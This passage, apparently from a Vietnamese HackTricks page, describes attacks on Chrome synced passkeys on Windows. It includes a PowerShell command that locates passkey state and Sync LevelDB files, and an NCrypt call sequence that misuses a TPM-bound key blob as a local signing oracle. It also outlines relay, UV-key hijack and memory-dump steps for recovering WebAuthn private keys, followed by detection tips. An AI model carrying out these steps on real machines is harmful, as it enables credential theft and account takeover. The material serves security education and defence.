Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Blob khóa gắn với TPM vẫn có thể bị lạm dụng làm oracle ký cục bộ

Nếu trình duyệt xuất khóa danh tính được TPM bảo vệ dưới dạng **`NCRYPT_OPAQUE_KEY_BLOB`** và lưu blob đó ở trạng thái người dùng có thể truy cập, malware **không** cần trích xuất khóa riêng thô. Nó chỉ cần nhập lại blob trên **cùng máy** và yêu cầu TPM cục bộ ký dữ liệu do kẻ tấn công kiểm soát:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Điều này có nghĩa là **ràng buộc phần cứng ngăn việc xuất khóa ra khỏi thiết bị, nhưng không ngăn cùng người dùng sử dụng khóa trên endpoint bị xâm phạm**.

### Các cách khai thác thực tế

1. **Pass-ta-key / relay danh tính thiết bị**<sup>[[4]](#references)</sup>
   - Liệt kê `WebauthnCredentialSpecifics` từ LevelDB của Chrome.
   - Bắt đầu đăng nhập bằng passkey và lấy một WebAuthn challenge mới.
   - Dùng blob `wrapped_identity_private_key` bị đánh cắp trên TPM của nạn nhân để ký phần binding của yêu cầu cloud-authenticator.
   - Chuyển tiếp assertion nhận được đến relying party.
   - Cách này đặc biệt hữu ích khi RP chấp nhận `userVerification=preferred` hoặc không từ chối các assertion có **`UV=0`**.
2. **Chiếm quyền khóa UV đang chờ**<sup>[[4]](#references)</sup>
   - Buộc thiết lập lại bằng cách xóa `passkey_enclave_state` hoặc gửi một thao tác `device/forget` hợp lệ đã được ký.
   - Nếu quá trình thiết lập để thiết bị ở trạng thái **`uv_key_pending`**, đăng ký một khóa công khai UV do kẻ tấn công kiểm soát.
   - Nếu nhà cung cấp không xác minh attestation / nguồn gốc secure-hardware của khóa UV mới, các chữ ký về sau từ khóa của kẻ tấn công sẽ được xem là **`UV=1`**.
3. **Đánh cắp master secret / khôi phục SDS**<sup>[[4]](#references)</sup>
   - Buộc khôi phục hoặc tham gia lại để Chrome tải master secret của synced-passkey.
   - Theo dõi việc tạo lại/chỉnh sửa `passkey_enclave_state`, sau đó dump bộ nhớ Chrome khi **security domain secret (SDS)** dạng plaintext đang hiện diện.
   - Dùng SDS khôi phục được để giải mã các trường đã mã hóa trong mọi bản ghi `WebauthnCredentialSpecifics` và khôi phục các khóa riêng WebAuthn có thể mang sang thiết bị khác.

### Gợi ý DFIR / phát hiện

- Theo dõi việc **xóa/tạo lại** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Cảnh báo khi các tiến trình không phải trình duyệt truy cập bất thường vào **`Sync Data\LevelDB`** của Chrome.
- Cảnh báo về **memory dump của Chrome** hoặc hành vi truy cập bộ nhớ liên tiến trình đáng ngờ.
- Điều tra các lời nhắc **Google Password Manager recovery PIN** lặp lại hoặc việc thiết lập lại ngoài dự kiến.
- Lưu ý rằng WebAuthn **`signCount`** thường không hữu ích với synced passkey vì giá trị này có thể giữ nguyên, khiến việc phát hiện bản sao theo cách thông thường kém hiệu quả.

## References

- [1] [Unit 42 – Điều tra các chiến dịch kéo dài nhiều năm nhắm vào các lĩnh vực có giá trị cao mà không bị phát hiện](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing bằng macro Word VBA qua SMTP → giải mã thông tin xác thực hMailServer → Veeam CVE-2023-27532 lên SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Bên trong Ink Dragon: hé lộ mạng lưới relay và cách thức hoạt động bên trong của một chiến dịch tấn công bí mật](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Một bề mặt tấn công mới trong xác thực không mật khẩu](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / lưu trữ khóa CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Cách kho dữ liệu Active Directory thực sự hoạt động: bên trong NTDS.dit (Phần 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Dump mật khẩu Lsass từ xa](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho mở rộng kho công cụ gián điệp mạng với bộ công cụ Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – hàm CreateFileW và `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – chế độ sao lưu Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Câu hỏi thường gặp về Telegram – chấm dứt các phiên đang hoạt động](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard và Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Bảo vệ và quản lý thông tin xác thực](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
{{#include ../../banners/hacktricks-training.md}}
